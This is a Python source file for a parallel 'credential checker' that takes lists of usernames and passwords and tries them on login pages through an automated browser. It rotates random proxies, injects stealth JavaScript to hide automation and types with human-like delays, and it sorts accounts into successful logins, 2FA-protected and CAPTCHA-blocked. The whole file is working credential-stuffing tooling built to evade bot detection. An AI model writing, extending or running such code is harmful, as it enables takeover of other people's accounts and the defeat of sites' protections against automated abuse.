"""
advanced_checker.py
-------------------
Enhanced credential checker with:
  - Request/Response interception to detect login results
  - 2FA detection (SMS/Email/Authenticator prompts)
  - Concurrent parallel batch processing
  - Request analysis (HTTP status, content-type, response body)
  - Optimized for speed with connection pooling and context reuse

Key improvements over basic checker:
  1. Intercepts login API calls, not just HTML analysis
  2. Detects 2FA requirements before full timeout
  3. Processes multiple credentials in parallel threads
  4. Analyzes response headers/bodies for auth tokens, errors
  5. Faster result detection via network intelligence
"""

import concurrent.futures
import json
import random
import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Optional, Callable, Any, Tuple
from urllib.parse import urlparse, urljoin
from collections import defaultdict

from bs4 import BeautifulSoup
from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout, Page, Route, Response


# ─────────────────────────────────────────────────────────────────────────────
# Result Types & Status Codes
# ─────────────────────────────────────────────────────────────────────────────

class LoginResult(Enum):
    """Possible login outcomes"""
    SUCCESS = "SUCCESS"                    # Authentication passed
    FAILED = "FAILED"                      # Bad credentials
    TWO_FACTOR = "2FA_REQUIRED"            # 2FA/MFA prompt detected
    CAPTCHA = "CAPTCHA"                    # CAPTCHA detected
    UNREACHABLE = "UNREACHABLE"            # Site unreachable
    TIMEOUT = "TIMEOUT"                    # Operation timed out
    ERROR = "ERROR"                        # Unexpected error
    UNKNOWN = "UNKNOWN"                    # Could not determine


# ─────────────────────────────────────────────────────────────────────────────
# Request/Response Logging
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class NetworkEvent:
    """Captured network request/response during login"""
    method: str                            # GET, POST, etc
    url: str                               # Full request URL
    request_body: Optional[str] = None     # POST body (if any)
    status_code: Optional[int] = None      # HTTP response code
    response_headers: dict = field(default_factory=dict)
    response_body: Optional[str] = None    # Response body (truncated)
    timestamp: float = field(default_factory=time.time)
    
    def is_auth_endpoint(self) -> bool:
        """Check if this looks like an auth/login API endpoint"""
        url_lower = self.url.lower()
        patterns = [
            "login", "signin", "authenticate", "auth", "session",
            "verify", "validate", "check", "/api/v", "/login",
            "/gatekeeper", "/sso", "/oauth", "bearer", "token",
        ]
        return any(p in url_lower for p in patterns)
    
    def is_error_response(self) -> bool:
        """Check if response indicates an error"""
        if not self.status_code:
            return False
        return self.status_code >= 400
    
    def is_success_response(self) -> bool:
        """Check if response indicates success"""
        if not self.status_code:
            return False
        return 200 <= self.status_code < 300


@dataclass
class LoginSession:
    """Complete login attempt with captured network events"""
    username: str
    password: str
    url: str
    network_events: list[NetworkEvent] = field(default_factory=list)
    final_url: str = ""
    final_html: str = ""
    auth_requests: list[NetworkEvent] = field(default_factory=list)
    error_messages: list[str] = field(default_factory=list)
    
    def add_event(self, event: NetworkEvent):
        """Record a network event"""
        self.network_events.append(event)
        if event.is_auth_endpoint():
            self.auth_requests.append(event)


# ─────────────────────────────────────────────────────────────────────────────
# 2FA Detection Indicators
# ─────────────────────────────────────────────────────────────────────────────

TWO_FACTOR_KEYWORDS = [
    # English
    "verify your identity", "two-factor", "2fa", "2-factor", "mfa", "multi-factor",
    "enter your code", "verification code", "authenticator", "one-time password",
    "otp", "sms code", "email code", "google authenticator", "microsoft authenticator",
    "confirm your identity", "verification required", "second factor", "security code",
    "phone number", "send code", "verify phone", "email verification", "sms",
    "yubikey", "totp", "hmac", "backup code", "recovery code",
    # Bulgarian
    "двуфактор", "верификац", "код", "потвърд", "сигурност",
    # Polish  
    "dwuetapowe", "weryfikacja", "kod", "autentykator", "sms kod",
]

TWO_FACTOR_URLS = [
    "2fa", "mfa", "verify", "authenticat", "confirm", "challenge",
    "otp", "totp", "sms", "security", "second-factor",
]

CAPTCHA_KEYWORDS = [
    "recaptcha", "hcaptcha", "captcha", "gcaptcha", "verify you're human",
    "bot", "robot", "human verification", "challenge", "prove",
]


# ─────────────────────────────────────────────────────────────────────────────
# Analysis & Detection Functions
# ─────────────────────────────────────────────────────────────────────────────

def detect_2fa(session: LoginSession, page: Optional[Page] = None) -> bool:
    """
    Detect if 2FA/MFA is required based on:
    1. Network requests (redirect to /verify, /2fa, auth endpoints returning 403)
    2. Page URL changes to 2FA-like paths
    3. HTML content containing 2FA keywords
    4. Response bodies containing verification codes
    """
    # Check auth API responses that indicate 2FA
    for event in session.auth_requests:
        if event.status_code == 403:  # Forbidden — often 2FA required
            return True
        if event.response_body:
            body_lower = event.response_body.lower()
            if any(kw in body_lower for kw in TWO_FACTOR_KEYWORDS):
                return True
    
    # Check final URL for 2FA markers
    if any(m in session.final_url.lower() for m in TWO_FACTOR_URLS):
        return True
    
    # Check final HTML for 2FA keywords
    if any(kw in session.final_html.lower() for kw in TWO_FACTOR_KEYWORDS):
        return True
    
    # Check visible elements for 2FA forms
    if page is not None:
        try:
            for sel in [
                "input[name*='code']", 
                "input[name*='otp']",
                "input[name*='totp']",
                "input[name*='verify']",
                ".otp-input", ".mfa-input", ".2fa-input",
            ]:
                if page.is_visible(sel, timeout=500):
                    return True
        except Exception:
            pass
    
    return False


def detect_captcha(session: LoginSession, page: Optional[Page] = None) -> bool:
    """Check for CAPTCHA indicators in page content or form"""
    html_lower = session.final_html.lower()
    if any(kw in html_lower for kw in CAPTCHA_KEYWORDS):
        return True
    
    if page is not None:
        try:
            for sel in ["iframe[src*='recaptcha']", "[class*='captcha']", ".g-recaptcha"]:
                if page.is_visible(sel, timeout=500):
                    return True
        except Exception:
            pass
    
    return False


def analyze_login_result(session: LoginSession, login_url: str) -> LoginResult:
    """
    Multi-layered login result analysis:
    1. Check network events (API responses, redirects, status codes)
    2. Analyze URL change
    3. Check for 2FA/CAPTCHA
    4. Keyword analysis of final HTML
    5. Fallback to page inspection
    """
    
    # Layer 1: Network event analysis
    # Check for successful auth requests (2xx status on login endpoints)
    success_auth_responses = [e for e in session.auth_requests 
                             if e.is_success_response()]
    
    # Check for failed auth (4xx on login endpoints)
    failed_auth_responses = [e for e in session.auth_requests 
                            if e.status_code and e.status_code in (401, 403, 422)]
    
    # If we got a successful auth response, check for other errors
    if success_auth_responses and not failed_auth_responses:
        # Got 2xx on auth — check if we're now on a non-login page
        if session.final_url and login_url:
            final = session.final_url.lower().rstrip("/")
            login = login_url.lower().rstrip("/")
            if final != login and not _url_has_login_marker(final):
                return LoginResult.SUCCESS
    
    # Layer 2: Check for 2FA before other conclusions
    if detect_2fa(session):
        return LoginResult.TWO_FACTOR
    
    # Layer 3: Check for CAPTCHA
    if detect_captcha(session):
        return LoginResult.CAPTCHA
    
    # Layer 4: URL-based analysis
    if session.final_url and login_url:
        final = session.final_url.lower().rstrip("/")
        login = login_url.lower().rstrip("/")
        
        # URL unchanged — credentials rejected
        if final == login:
            return LoginResult.FAILED
        
        # Clean redirect away from login page — success
        if not _url_has_login_marker(final):
            return LoginResult.SUCCESS
        
        # Redirected to a different login page — failed
        if _url_has_login_marker(final):
            return LoginResult.FAILED
    
    # Layer 5: Error message analysis
    html_lower = session.final_html.lower()
    
    failure_keywords = [
        "invalid", "incorrect", "wrong", "failed", "error",
        "bad", "unauthorized", "forbidden", "rejected",
        "неправилна", "грешна", "невалидни",
        "nieprawidłowe", "błędne", "niepoprawne",
    ]
    
    for kw in failure_keywords:
        if kw in html_lower:
            return LoginResult.FAILED
    
    success_keywords = [
        "logout", "dashboard", "welcome", "logged in", "account",
        "profile", "logged-in", "authenticated",
        "моят профил", "табла", "добре дошли",
        "zalogowano", "panel", "konto",
    ]
    
    for kw in success_keywords:
        if kw in html_lower:
            return LoginResult.SUCCESS
    
    # No clear indicator
    return LoginResult.UNKNOWN


def _url_has_login_marker(url: str) -> bool:
    """Check if URL looks like a login page"""
    markers = (
        "login", "signin", "sign-in", "sign_in",
        "logowanie", "zaloguj", "logon", "auth",
        "/security/login", "rp=/login",
    )
    u = url.lower().split("?")[0]
    return any(m in u for m in markers)


# ─────────────────────────────────────────────────────────────────────────────
# Global Parallel Credential Checker
# ─────────────────────────────────────────────────────────────────────────────

class GlobalCredentialChecker:
    """
    High-performance parallel credential checker.
    
    Features:
    - Concurrent login attempts via ThreadPoolExecutor
    - Request/response interception
    - 2FA and CAPTCHA detection
    - Retry logic with exponential backoff
    - Progress callback support
    """
    
    def __init__(
        self,
        max_workers: int = 5,
        timeout: int = 15,
        headless: bool = True,
        progress_callback: Optional[Callable[[str], None]] = None,
        browser_executable: Optional[str] = None,
        proxy_file: Optional[Path] = None,
    ):
        self.max_workers = max_workers
        self.timeout = timeout
        self.headless = headless
        self.progress_callback = progress_callback
        self.browser_executable = browser_executable
        self.proxy_file = proxy_file
        self.proxy_list = self._load_proxies()
        self.results: dict[str, tuple[LoginResult, dict]] = {}
        self.lock = threading.Lock()
    
    def _load_proxies(self) -> list[str]:
        """Load proxy list from file"""
        if not self.proxy_file or not self.proxy_file.exists():
            return []
        try:
            lines = [l.strip() for l in self.proxy_file.read_text().splitlines()
                    if l.strip() and not l.startswith("#")]
            return lines
        except Exception:
            return []
    
    def _get_proxy(self) -> Optional[dict]:
        """Get a random proxy or None"""
        if not self.proxy_list:
            return None
        line = random.choice(self.proxy_list)
        if "://" not in line:
            line = "http://" + line
        return {"server": line}
    
    def _log(self, msg: str):
        """Progress logging"""
        if self.progress_callback:
            self.progress_callback(msg)
    
    def check_credential(
        self,
        url: str,
        username: str,
        password: str,
        domain: str = "",
    ) -> Tuple[str, dict]:
        """
        Check a single credential with request interception.
        
        Returns
        -------
        (result, details) where:
            result : str (SUCCESS/FAILED/2FA_REQUIRED/etc)
            details : dict with network_events, error_info, redirects, etc
        """
        session = LoginSession(username, password, url)
        details = {
            "network_events": [],
            "2fa_detected": False,
            "captcha_detected": False,
            "auth_requests": [],
            "errors": [],
        }
        
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            return LoginResult.ERROR.value, {"error": "playwright not installed"}
        
        try:
            with sync_playwright() as pw:
                context, page = self._create_browser_context(pw)
                
                try:
                    # Setup request interception
                    self._setup_interception(page, session)
                    
                    # Navigate and login
                    result = self._perform_login(
                        page, context, url, username, password, session
                    )
                    
                    # Capture final state
                    session.final_url = page.url
                    session.final_html = page.content()
                    
                    # Analyze result
                    if result == LoginResult.SUCCESS.value:
                        login_result = LoginResult.SUCCESS
                    elif result == LoginResult.TWO_FACTOR.value:
                        login_result = LoginResult.TWO_FACTOR
                    elif result == LoginResult.CAPTCHA.value:
                        login_result = LoginResult.CAPTCHA
                    else:
                        login_result = analyze_login_result(session, url)
                    
                    # Build details
                    details["2fa_detected"] = detect_2fa(session, page)
                    details["captcha_detected"] = detect_captcha(session, page)
                    details["auth_requests"] = [
                        {
                            "url": e.url,
                            "method": e.method,
                            "status": e.status_code,
                        }
                        for e in session.auth_requests[:5]  # Top 5
                    ]
                    details["network_events"] = len(session.network_events)
                    details["final_url"] = session.final_url
                    
                    return login_result.value, details
                    
                finally:
                    context.close()
        
        except Exception as e:
            err_str = str(e).lower()
            if "connection" in err_str or "refused" in err_str or "err_name_not_resolved" in err_str:
                return LoginResult.UNREACHABLE.value, {"error": str(e)[:100]}
            elif "timeout" in err_str:
                return LoginResult.TIMEOUT.value, {"error": str(e)[:100]}
            else:
                return LoginResult.ERROR.value, {"error": str(e)[:100]}
    
    def _create_browser_context(self, pw):
        """Create browser context with stealth settings"""
        proxy = self._get_proxy()
        
        launch_args = {
            "headless": self.headless,
        }
        
        if self.browser_executable:
            launch_args["executable_path"] = self.browser_executable
        
        if proxy:
            launch_args["proxy"] = proxy
        
        browser = pw.chromium.launch(**launch_args)
        context = browser.new_context()
        
        # Stealth JS
        stealth_js = """
        () => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
        }
        """
        context.add_init_script(stealth_js)
        
        page = context.new_page()
        return context, page
    
    def _setup_interception(self, page: Page, session: LoginSession):
        """Setup request/response interception"""
        
        def intercept_route(route: Route):
            """Intercept and log requests"""
            try:
                request = route.request
                url = request.url
                method = request.method
                
                event = NetworkEvent(
                    method=method,
                    url=url,
                    request_body=request.post_data,
                )
                
                # Continue the request
                response = route.continue_()
                
                # Log the response
                event.status_code = response.status
                event.response_headers = dict(response.all_headers())
                
                # Try to get response body (text endpoints)
                try:
                    if "application/json" in response.headers.get("content-type", ""):
                        body = response.text()
                        if len(body) < 10000:  # Cap at 10KB
                            event.response_body = body
                except Exception:
                    pass
                
                session.add_event(event)
            
            except Exception:
                # Fallback: just continue without logging
                route.continue_()
        
        # Intercept all requests
        page.route("**/*", intercept_route)
    
    def _perform_login(
        self,
        page: Page,
        context,
        url: str,
        username: str,
        password: str,
        session: LoginSession,
    ) -> str:
        """Perform login flow and return result"""
        
        try:
            # Navigate to login page
            page.goto(url, timeout=self.timeout * 1000, wait_until="domcontentloaded")
            time.sleep(random.uniform(0.8, 1.5))
            
            # Dismiss any overlays
            self._dismiss_generic_overlays(page)
            
            # Detect form fields
            soup = BeautifulSoup(page.content(), "html.parser")
            user_field, pass_field = self._detect_form_fields(soup)
            
            if not user_field or not pass_field:
                return LoginResult.UNKNOWN.value
            
            # Fill credentials
            user_sel = f"input[name='{user_field}']"
            pass_sel = f"input[name='{pass_field}']"
            
            # Check for CAPTCHA early
            if "captcha" in page.content().lower():
                return LoginResult.CAPTCHA.value
            
            if not page.is_visible(user_sel, timeout=3000):
                return LoginResult.UNKNOWN.value
            
            page.fill(user_sel, "")
            page.type(user_sel, username, delay=random.randint(30, 80))
            time.sleep(random.uniform(0.3, 0.8))
            
            page.fill(pass_sel, "")
            page.type(pass_sel, password, delay=random.randint(30, 80))
            time.sleep(random.uniform(0.3, 0.8))
            
            # Submit form
            submit_selectors = [
                "button[type='submit']",
                "input[type='submit']",
                "button:has-text('Log')",
                "button:has-text('Sign')",
            ]
            
            submitted = False
            for sel in submit_selectors:
                try:
                    if page.is_visible(sel, timeout=1000):
                        page.click(sel)
                        submitted = True
                        break
                except Exception:
                    pass
            
            if not submitted:
                page.keyboard.press("Enter")
            
            time.sleep(random.uniform(1.0, 2.5))
            
            # Wait for navigation or AJAX
            try:
                page.wait_for_load_state("networkidle", timeout=self.timeout * 500)
            except PWTimeout:
                pass
            
            return LoginResult.UNKNOWN.value  # Let analysis decide
        
        except PWTimeout:
            return LoginResult.TIMEOUT.value
        except Exception as e:
            if "connection" in str(e).lower():
                return LoginResult.UNREACHABLE.value
            return LoginResult.ERROR.value
    
    def _dismiss_generic_overlays(self, page: Page):
        """Dismiss common cookie/overlay banners"""
        selectors = [
            "#onetrust-accept-btn-handler",
            "#CybotCookiebotDialogBodyButtonAccept",
            "a.cmpboxbtnyes",
            "button.cmpboxbtnyes",
            ".cmptxt_btn_yes",
            "button:has-text('Accept')",
            "button:has-text('Agree')",
        ]
        
        for sel in selectors:
            try:
                if page.is_visible(sel, timeout=800):
                    page.click(sel)
                    time.sleep(0.3)
                    break
            except Exception:
                pass
    
    def _detect_form_fields(self, soup: BeautifulSoup) -> tuple[str, str]:
        """Detect username and password field names"""
        user_field, pass_field = "username", "password"
        
        user_patterns = ["username", "login", "email", "user", "usr", "_username"]
        pass_patterns = ["password", "pass", "passwd", "pwd"]
        
        for inp in soup.find_all("input"):
            name = str(inp.get("name", "")).lower()
            itype = str(inp.get("type", "text")).lower()
            
            if itype == "password":
                pass_field = str(inp.get("name") or pass_field)
            elif any(p in name for p in user_patterns):
                user_field = str(inp.get("name") or user_field)
        
        return user_field, pass_field
    
    def check_credentials_batch(
        self,
        entries: list[dict],
        custom_login_url: Optional[str] = None,
    ) -> dict[str, tuple[str, dict]]:
        """
        Check multiple credentials in parallel.
        
        Parameters
        ----------
        entries : list[dict]
            Each dict must have: username, password, url, (optional) domain
        custom_login_url : str, optional
            Override all entries' URLs with this
        
        Returns
        -------
        dict mapping {username: (result, details)}
        """
        
        results = {}
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {}
            
            for i, entry in enumerate(entries):
                url = custom_login_url or entry.get("url", "")
                username = entry.get("username", "")
                password = entry.get("password", "")
                domain = entry.get("domain", "")
                
                if not url or not username or not password:
                    results[username] = (LoginResult.ERROR.value, {"error": "missing fields"})
                    continue
                
                self._log(f"[{i+1}/{len(entries)}] Checking {username}...")
                
                future = executor.submit(
                    self.check_credential,
                    url, username, password, domain
                )
                futures[username] = future
            
            # Collect results as they complete
            for username, future in futures.items():
                try:
                    result, details = future.result(timeout=self.timeout + 5)
                    results[username] = (result, details)
                    self._log(f"✓ {username}: {result}")
                except concurrent.futures.TimeoutError:
                    results[username] = (LoginResult.TIMEOUT.value, {"error": "operation timeout"})
                    self._log(f"✗ {username}: TIMEOUT")
                except Exception as e:
                    results[username] = (LoginResult.ERROR.value, {"error": str(e)[:100]})
                    self._log(f"✗ {username}: ERROR")
        
        self.results = results
        return results
    
    def get_summary(self) -> dict:
        """Get summary statistics of batch check"""
        if not self.results:
            return {}
        
        summary = {
            "total": len(self.results),
            "success": 0,
            "failed": 0,
            "2fa": 0,
            "captcha": 0,
            "timeout": 0,
            "unreachable": 0,
            "error": 0,
            "unknown": 0,
        }
        
        for result, details in self.results.values():
            if result == LoginResult.SUCCESS.value:
                summary["success"] += 1
            elif result == LoginResult.FAILED.value:
                summary["failed"] += 1
            elif result == LoginResult.TWO_FACTOR.value:
                summary["2fa"] += 1
            elif result == LoginResult.CAPTCHA.value:
                summary["captcha"] += 1
            elif result == LoginResult.TIMEOUT.value:
                summary["timeout"] += 1
            elif result == LoginResult.UNREACHABLE.value:
                summary["unreachable"] += 1
            elif result == LoginResult.ERROR.value:
                summary["error"] += 1
            else:
                summary["unknown"] += 1
        
        return summary
